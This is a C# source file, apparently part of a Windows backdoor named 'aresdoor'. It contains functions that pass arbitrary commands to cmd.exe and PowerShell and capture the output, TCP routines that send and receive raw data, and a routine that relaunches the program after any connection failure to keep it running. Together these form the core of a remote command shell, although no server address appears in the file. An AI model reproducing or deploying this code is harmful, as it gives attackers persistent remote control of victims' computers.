using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace aresdoor
{
    class Networking
    {
        /* Check connection to a defined server */
        public static bool checkInternetConn(string server)
        {
            try
            {
                using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
                {
                    System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
                    return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
                }
            }
            catch (Exception) { return false; }
        }

        /* Resolve hostname to the first IP address that shows in the array */
        public static string resolveHostName(string hostname)
        {
            System.Net.IPAddress[] addressList = System.Net.Dns.GetHostAddresses(hostname);
            return addressList[0].ToString();
        }
    }

    class CommandShell
    {
        /* Execute commands via command prompt */
        public static string execCommandPrompt(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }

        /* Execute commands via powershell */
        public static string execPowershellCommand(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }
    }

    class NetworkCommunication
    {
        public static void RestartApplication(int errorCode)
        {
            // Starts a new instance of the program itself
            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);

            // Closes the current process
            Environment.Exit(errorCode);
        }

        public bool DataTravelTO(System.Net.Sockets.TcpClient tcpClient, string rawDataToSend)
        {
            try
            {
                byte[] dataToSend = System.Text.Encoding.ASCII.GetBytes(rawDataToSend);
                tcpClient.GetStream().Write(dataToSend, 0, dataToSend.Length); // Send data

                return true; // if we got here then it worked!
        #if DEBUG
            } catch (Exception exc)
            { Console.WriteLine(exc.Message); CloseTCPStream(tcpClient); RestartApplication(1); return false; }
        #else
            } catch (Exception)
            { CloseTCPStream(tcpClient); RestartApplication(1); return false; }
        #endif
        }

        public string DataTravelFROM(System.Net.Sockets.TcpClient tcpClient)
        {
            int bytes = default(int);
            byte[] tcpdata = new byte[256];

            try { bytes = tcpClient.GetStream().Read(tcpdata, 0, tcpdata.Length); } // Read TCP data from stream
        #if DEBUG
            catch (Exception exc)
            { Console.WriteLine(exc.Message); CloseTCPStream(tcpClient); RestartApplication(1); }
        #else
            catch (Exception)
            { CloseTCPStream(tcpClient); RestartApplication(1); }
        #endif

            return System.Text.Encoding.ASCII.GetString(tcpdata, 0, bytes);
        }

        public bool CloseTCPStream(System.Net.Sockets.TcpClient tcpClient)
        {
            try
            {
                tcpClient.GetStream().Close(); // Close the stream before the connection
                tcpClient.Close();

                return true;
            }
            catch (Exception) { return false; }
        }
    }
}
